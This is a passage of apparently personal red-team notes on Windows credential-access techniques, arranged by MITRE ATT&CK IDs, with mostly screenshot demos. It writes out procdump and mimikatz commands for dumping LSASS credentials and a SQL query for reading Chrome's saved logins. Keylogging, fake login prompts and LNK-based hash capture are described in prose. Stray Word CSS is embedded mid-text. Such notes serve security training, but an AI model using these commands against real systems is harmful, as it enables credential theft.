![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRklWN6TybjAt83ZVP-%2F-MRklmHSgkR7k4s5lioa%2Fimage.png?alt=media&token=60e114be-9573-4463-a548-2894537afc57)

Another tool I encountered was PWDUMP from BlackArchLinux this requires the same two files the SAM and SYSTEM from the Registry and will dump hashes but sure to use the correct order of SYSTEM and then SAM files.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRklWN6TybjAt83ZVP-%2F-MRklnBd2NZpjmoKjwUX%2Fimage.png?alt=media&token=a65f6133-0d18-4a04-a8c2-955c93fd275b)

I do encourage to try other tools to achieve this goal as well, as there is a plethora of them out there, Good Luck.

### lsass-memory

Adversaries may attempt to access credential material stored in the process memory of the Local Security SubSystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.

As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

For example, on the target host use procdump:

·         Procdump -ma lsass.exe lsass_dump

Locally, mimikatz can be run using:

·         Ekurlsa::minidump lsassdump.dmp

·         Sekurlsa::logonPasswords

Windows Security Support Provider(SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys:

·         

**HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages**

**HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages**

An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when AddSecurityPackage Windows API function is called.

The following SSPs can be used to access credentials:

·         Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.

·         Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.

·         Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.

·         CredSSP: Provides SSO and Network Level Authentication for Remote Desktop Services.

**Example**

There are various methods for Dumping Credentials here but I will work with the most commonly known for Demonstration Purposes, will start with mimikatz.

**Administrator Privileges are needed**

When we have the mimikatz binary on Disk we can run it with the following commands and Dump Credentials. Down below we see a demonstration of a successful attack

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRklAOh1rctuU2KMgC3%2F-MRklMigwQjHp3iAtLN4%2Fimage.png?alt=media&token=f790da30-07af-47fa-a18e-f722a23cc355)

Now will continue with another sample, ProcDump. A windows signed binary from SysinternalSuite will create a dump of the lsass process and have credentials stored on it.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRklAOh1rctuU2KMgC3%2F-MRklOSUkj0vL3_ypZ3g%2Fimage.png?alt=media&token=3ab62688-5074-4a2c-8909-e8f46c4071c5)

Above we see the image of Procdump executing and dumping our process. We can see our file below dumped on the machine.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRklAOh1rctuU2KMgC3%2F-MRklQG1ztzQVy74C6tF%2Fimage.png?alt=media&token=29eded55-ff6d-4aba-b55b-bdd804a2d5fd)

Now to extract credentials is simple we can use tools such as mimikatz or pypykatz on another machine and work with this file, here are a few demonstrations:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRklAOh1rctuU2KMgC3%2F-MRklR1w2MoS9F-mOkDH%2Fimage.png?alt=media&token=bf3088ed-6143-4b7e-ae2c-690419fdd382)

Above we see that we can change mimikatz to MINIDUMP and have it grab the credentials from the DUMP file. But what if we only have a Linux box?, another feasible option would be to use pypykatz the python version of mimikatz.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRklAOh1rctuU2KMgC3%2F-MRklRv49QvR7RtwSXFD%2Fimage.png?alt=media&token=c2164f25-c495-4a01-810c-ee7b333d8988)

Above we can see a sample of pypykatz grabbing creds from a dump file. Let's proceed with MiniDumpW. This was designed to work specifically with rundll32 it requires 3 arguments where the third one is the should have everything wrapped in quotation marks as the 2 first are ignored.

One of the first thing we need to find first is the process of lsass.exe

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRklAOh1rctuU2KMgC3%2F-MRklSsQCK0o2VkQjphX%2Fimage.png?alt=media&token=bdb42464-5ff1-4317-a871-5df6d882ac46)

Once located we use the command properly

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRklAOh1rctuU2KMgC3%2F-MRklUBO-XR7e-Mq9Pot%2Fimage.png?alt=media&token=84b906cc-7b2b-4e07-95ab-aa6addc5f5a0)

And we see our dmp file created.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRklAOh1rctuU2KMgC3%2F-MRklUxtHE4fWyIWdidS%2Fimage.png?alt=media&token=a8f0deec-d5ca-4e00-a262-f20ca09b4b6d)

We can also use this with mimikatz offline or as well with pypykatz.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRklAOh1rctuU2KMgC3%2F-MRklVdeEIq9mY5Bm73q%2Fimage.png?alt=media&token=b6854fd2-f2a7-4de5-9813-185d8c7ccbb5)

## t1040-network-sniffing

Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as LLMNR/NBT-NS Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g.: IP address, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.

**Example**

A great tool to work with when dong Network Sniffing is WireShark and Bettercap, I understand there might be more [please do let me know] but these are very common and well known tools to achieve Network Sniffing.

Bettercap:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkktcm1FIWGJ12kkgS%2F-MRkl1-Gg64M7x7jmjFg%2Fimage.png?alt=media&token=a574357c-1fc0-433b-b1b8-f67fa745096e)

WireShark

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkktcm1FIWGJ12kkgS%2F-MRkl1xg5e9vIzFRHCGw%2Fimage.png?alt=media&token=7f3e8179-4d8c-4871-b822-93fe3c0c008e)

## t1556-modify-authentication-process

Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server(LSASS) process and the Security Accounts Manager (SAM) on Windows or pluggable authentication modules (PAM) on Unix-based systems, responsible for gathering, storing, and validating credentials.

Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.

### password-filter-dll

Adversaries may register malicious filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated.

Windows password filter are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.

Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.

**Example:**

**Props to PentestBlog there is a video Demo!! And also a tool that has been utilized. Please do go check it out.**

GitHub - 3gstudent/PasswordFilter: 2 ways of  Password Filter DLL to record the plaintext password

GitHub

​

### domain-controller-authentication

Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts.

Malware may be used to inject false credentials in the authentication process on a domain controller with the intent of creating a backdoor used to access any user's account and/or credentials (ex: Skeleton key). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the skeleton key is erased form memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.

**An incredible post from Pentestlab can be found here it it’s a great resource and do check it out for this technique.**

Skeleton Key

Penetration Testing Lab

​

## t1557-man-in-the-middle

### arp-cache-poisoning

Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.

The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as media access control (MAC) address. Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.

An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.

The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.

Adversaries may use ARP cache poisoning as a means to man-in-the-middle (MiTM) network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.

**Example:**

**As I am still new to the tool Bettercap I have managed to demonstrate a small Demo of Bettercap arp-spoofing and capturing traffic**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkgrE66S7NRJAReOv-%2F-MRkgrvCuv4U0UE3mGVp%2Fimage.png?alt=media&token=1205dbe9-8fef-4406-8912-597a3b2d772b)

I highly recommend to start playing with the tool and learn from the Documentation to better get a hold of this awesome tool.

### untitled

By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System(DNS) format and allows hosts on the same local link to perform name resolution of other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.

Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack the hashes offline through Brute Force to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.

Several tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and Responder.

**Example:**

Here will use Responder a very well-known and popular tools with Red Teamers and Penetration Testers. Responder as the Name implies is a responding tool for LLMNR traffic when a Windows uses DNS for resolving Names but when the name is not found it goes back to LLMNR and NBT-NS traffic to resolve a name, when this is not found and Responder is Running this just say's "Hey yeah, this is me.."   Now let's show a sample.

**Responder**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkg8o0gSUFQXvyfKrN%2F-MRkg_tF0rb8ow8Yib43%2Fimage.png?alt=media&token=49e7123d-f095-4f4c-8bde-71529e326dfd)

In this demonstration the user is trying to access an un-existing Share since it cannot find it then Responder just responds saying that it's the share the user is looking for and request for a Hash to authenticate

We can check it out ourselves by just using the Run Application and search for a share.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkg8o0gSUFQXvyfKrN%2F-MRkg_0_Ynmfa_n0-w8r%2Fimage.png?alt=media&token=9612fc76-c4c9-4c54-94f2-ffb7b356d0cf)

## t1056-input-capture

Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for substantial period of time before credentials can be successfully captured.

​

### web-portal-capture

Adversaries may install code on externally facing portals, such as VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.

This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through External Remote Services and Valid Accounts or as part of the Initial Compromise by exploitation of the externally facing web service.

**Example:**

Here by creating a simple login form in HTML and combining it with the SETOOLKIT Tool this custom login form will capture credentials from the user, this will just need some social engineering to have the user enter their credentials.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkg0ftNMDfvLR5nIwB%2F-MRkg7jzW0FER3eC55z5%2Fimage.png?alt=media&token=dcb9873e-1517-490f-b454-d9e78c7aeb6a)

### gui-input-capture

Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: Bypass User Account Control).

Adversaries may mimic functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. This type of prompt can be used to collect credentials via various languages such as AppleScript and PowerShell.

**Example:**

I will demonstrate a GUI Capture by using a tool called 

**Pickle**

 the tool is great for social engineering on internal networks  having users believe that they need to re-login because of an error or anything that tricks them to input there credentials, the great thing about this tool is that it will actually try the credentials against SMB and verify if they are correct.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkfyL-KivqpqO7yjCv%2F-MRkfzOXEPqpslwxZjSh%2Fimage.png?alt=media&token=35eac75f-aba2-491a-8766-4c22997ed662)

A sample of the prompt asking for credentials and typing the incorrect ones.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkfyL-KivqpqO7yjCv%2F-MRkg-4pboFvOHouS-E2%2Fimage.png?alt=media&token=41cf01c1-e057-4a33-85b7-41a3151b026a)

And once the correct credentials are added it will close and show the correct credentials.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkfyL-KivqpqO7yjCv%2F-MRkg-qmSL11uW4aR1in%2Fimage.png?alt=media&token=c279b31f-3bc0-478c-abc4-d0724f002591)

### keylogging

Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for substantial period of time before credentials can be successfully captured.

Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:

·         Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.

·         Reading raw keystroke data from the hardware buffer.

·         Windows Registry modifications.

·         Custom drivers.

·         Modify System image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.

**Example:**

In this Demo I will use a simple PowerShell Keylogger. To demonstrate that though this technique is very well known it is still reliable in it's ow way, and with the implementation of using PowerShell this can be run completely in memory. We just need to be aware that this script will log the keystrokes but will create a file on Disk with all the inputs. This needs to be cancelled so the file is created.

We will import the script into out PowerShell session and start running the module.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkfrUmtbF7deiqiNhM%2F-MRkfrd7niuc55u5tmqg%2Fimage.png?alt=media&token=14131a0f-1fd4-4525-b924-245e60196c9d)

Once we cancel a notepad will open with all the keystrokes done during the time running.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkfrUmtbF7deiqiNhM%2F-MRkfsJEvaPEMkplU1P_%2Fimage.png?alt=media&token=8269f66c-56b7-46b9-8f2f-fc0b70f0ec32)

Of course this isn't OPSEC Safe but it is a simple demonstration of a Keylogger, there are many varieties of this technique out there written in many languages (C, C++, C#, ETC)

## t1187-forced-authentication

Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.

The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.

Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.

Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. Template Injection), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on Desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system access the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. With access to the credential hash, an adversary can perform off-line Brute Force cracking to gain access to plaintext credentials.

There are several different ways this can occur. Some specifics form in-the-wild use include:

·         A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. Template Injection). The document con include, for example, a request similar to file[:]//[remote address]/Normal.dotm to trigger the SMB request.

·         A modified .LNK or .SCF file with the icon filename pointing to an external reference such as \[remote address]\pic.png that will force the system to load the resource when the icon is rendered to repeatedly gather credentials.

**Example:**

A very easy way to apply this technique is just by changing the target of an LNK File (

**SCF Files are also used**

) we can have responder running in our attacking machine and wait for our victim to click on our modified LNK file so that it will try and connect and capture a hash, this method will force authentication since the user is tricked to click on our Shortcut link and send us the hashes.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkeZ5oTqpg76TTHfpw%2F-MRkfF8K-8Hap74nVEQ1%2Fimage.png?alt=media&token=33fa95e1-aa69-46b6-9cd2-c91d7fd460a3)

**Responder**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkeZ5oTqpg76TTHfpw%2F-MRkfFy01OK-bjpZtNdP%2Fimage.png?alt=media&token=80fd86ed-e704-464e-973a-360eecf3937f)

That way we see that our target tries to use the modified LNK to force the victim to authenticate to our attacking machine.

## t1555-credentials-from-password-stores

Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.

### credentials-from-web-browsers

Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.

For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, 

**AppData\Local\Google\Chrome\User Data\Default\Login Data**

AppData\Local\Google\Chrome\User Data\Default\Login Data

 and executing s SQL query:

**SELECT action_url, username_value, password_value FROM logins;**

SELECT action_url, username_value, password_value FROM logins;

. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function CryptUnprotectData, which uses the victim's cached logon credentials as the decryption key.

Adversaries have executed similar procedures for common web browsers such as Firefox, Safari, Edge, etc.

Adversaries may also acquire credentials by searching web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).

**Example:**

Users login a plethora of times using browsers in there Day to Day lives there are paths that contains these passwords encrypted that we could find and there are also Tools that can help us crack these passwords and find these logins from many browsers some great tools are 

[Lazagne](https://github.com/AlessandroZ/LaZagne/releases)

Lazagne

 and 

SharpWeb

[SharpWeb](https://github.com/AlessandroZ/LaZagne/releases)

​

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkeWUowjILykLgRnD2%2F-MRkeX7ZmgDaFRTb-A7s%2Fimage.png?alt=media&token=ef629994-a67a-4603-be9d-f1669e4748ac)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkeWUowjILykLgRnD2%2F-MRkeXspbb14ZL1sCmhG%2Fimage.png?alt=media&token=36e86081-b73c-45b8-859f-a0ea9caa8ed7)

## t1110-brute-force

Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.

### credential-stuffing

Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of tendency for users to use the same passwords across personal and business accounts.

Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.

Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:

·         SSH (22/TCP)

·         Telnet (23/TCP)

·         FTP (21/TCP)

·         NetBIOS / SMB / Samba (139/TCP & 445/TCP)

·         LDAP (389/TCP)

·         Kerberos (88/TCP)

·         RDP / Terminal Services (3389/TCP)

·         HTTP/HTTP Management Services (80/TCP & 443/TCP)

·         MSSQL (1433/TCP)

·         Oracle (1521/TCP)

·         MySQL (3306/TCP)

·         VNC (5900/TCP)

In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.

[[](https://www.us-cert.gov/ncas/alerts/TA18-086A)

​

**Example:**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkdxzgJBZ9W46VO10Q%2F-MRke3DEHX5WsoeoGKYz%2Fimage.png?alt=media&token=0b8a73ef-4817-4ba8-8310-cdb8c2a27f27)

The procedure for this technique is usually gaining the stolen credentials for this attack. Even though it is very simple to Buy and Find I will not point to any resources that will help in this attack(

**Let's be honest a simple Google Search is enough**

). But once the DB of Credentials are found you might get lucky and actually login to the service they are meant for since large scale organizations have the tendency of reusing these logins.

### password-spraying


<!--
 /* Font Definitions */
 @font-face
	{font-family:"Cambria Math";
	panose-1:2 4 5 3 5 4 6 3 2 4;
	mso-font-charset:0;
	mso-generic-font-family:roman;
	mso-font-pitch:variable;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:Calibri;
	panose-1:2 15 5 2 2 2 4 3 2 4;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-pitch:variable;
	mso-font-signature:-469750017 -1073732485 9 0 511 0;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
	{mso-style-unhide:no;
	mso-style-qformat:yes;
	mso-style-parent:"";
	margin-top:0in;
	margin-right:0in;
	margin-bottom:8.0pt;
	margin-left:0in;
	line-height:107%;
	mso-pagination:widow-orphan;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;
	mso-ascii-font-family:Calibri;
	mso-ascii-theme-font:minor-latin;
	mso-fareast-font-family:Calibri;
	mso-fareast-theme-font:minor-latin;
	mso-hansi-font-family:Calibri;
	mso-hansi-theme-font:minor-latin;
	mso-bidi-font-family:"Times New Roman";
	mso-bidi-theme-font:minor-bidi;}
.MsoChpDefault
	{mso-style-type:export-only;
	mso-default-props:yes;
	font-family:"Calibri",sans-serif;
	mso-ascii-font-family:Calibri;
	mso-ascii-theme-font:minor-latin;
	mso-fareast-font-family:Calibri;
	mso-fareast-theme-font:minor-latin;
	mso-hansi-font-family:Calibri;
	mso-hansi-theme-font:minor-latin;
	mso-bidi-font-family:"Times New Roman";
	mso-bidi-theme-font:minor-bidi;}
.MsoPapDefault
	{mso-style-type:export-only;
	margin-bottom:8.0pt;
	line-height:107%;}
@page WordSection1
	{size:8.5in 11.0in;
	margin:1.0in 1.0in 1.0in 1.0in;
	mso-header-margin:.5in;
	mso-footer-margin:.5in;
	mso-paper-source:0;}
div.WordSection1
	{page:WordSection1;}
 /* List Definitions */
 @list l0
	{mso-list-id:1720200957;
	mso-list-template-ids:-640789992;}
@list l0:level1
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:.5in;
	mso-level-number-position:left;
	text-indent:-.25in;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l0:level2
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:1.0in;
	mso-level-number-position:left;
	text-indent:-.25in;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l0:level3
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:1.5in;
	mso-level-number-position:left;
	text-indent:-.25in;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l0:level4
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:2.0in;
	mso-level-number-position:left;
	text-indent:-.25in;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l0:level5
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:2.5in;
	mso-level-number-position:left;
	text-indent:-.25in;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l0:level6
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:3.0in;
	mso-level-number-position:left;
	text-indent:-.25in;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l0:level7
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:3.5in;
	mso-level-number-position:left;
	text-indent:-.25in;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l0:level8
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:4.0in;
	mso-level-number-position:left;
	text-indent:-.25in;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
@list l0:level9
	{mso-level-number-format:bullet;
	mso-level-text:;
	mso-level-tab-stop:4.5in;
	mso-level-number-position:left;
	text-indent:-.25in;
	mso-ansi-font-size:10.0pt;
	font-family:Symbol;}
ol
	{margin-bottom:0in;}
ul
	{margin-bottom:0in;}
-->



Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid accounts credentials. Password spraying uses one password (e.g. 'Password01'), or small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockputs that would normally occur when brute forcing a single account with many passwords.

Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:

·         SSH (22/TCP)

·         Telnet (23/TCP)

·         FTP (21/TCP)

·         NetBIOS / SMB / Samba (139/TCP & 445/TCP)

·         LDAP (389/TCP)

·         Kerberos (88/TCP)

·         RDP / Terminal Services (3389/TCP)

·         HTTP/HTTP Management Services (80/TCP & 443/TCP)

·         MSSQL (1433/TCP)

·         Oracle (1521/TCP)

·         MySQL (3306/TCP)

·         VNC (5900/TCP)

In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols", as well as externally facing email applications, such as Office 365.

In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows "logon failure" event ID 4625.

**Example:**

In this method we will use Password Spraying this technique is great in big environments as sometimes there is a password reuse and we don't need to Brute Force an account in a live environment and lock them out.

A great tool for this in an Environment is CrackMapExec. (

**There are also alternatives that even work with PowerShell**

) we will just need to grab an account and typically use a very common format of passwords used in corporations such as 

**Season+Year**

.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkdoknlVM8pROeQq_h%2F-MRkdpEET5TvtLXUJASD%2Fimage.png?alt=media&token=07358abe-1d79-4d8f-9042-a23cc95b9482)

By creating a user list and using it against a single password, we are reversing the brute force technique instead of multiple passwords for 1 account and receiving a lockdown we can try 1 very common password against multiple users.

